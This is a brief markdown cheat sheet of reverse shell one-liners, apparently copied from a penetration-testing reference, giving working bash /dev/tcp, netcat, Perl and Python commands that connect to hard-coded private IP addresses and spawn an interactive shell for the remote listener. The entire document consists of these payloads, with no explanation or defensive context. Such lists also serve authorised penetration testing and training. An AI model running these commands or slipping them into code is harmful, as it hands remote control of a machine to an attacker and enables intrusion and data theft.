# Reverse shell scripts

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Using shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

## Using Netcat
cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  

## Using Perl
perl -e 'use Socket;$i="192.168.1.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
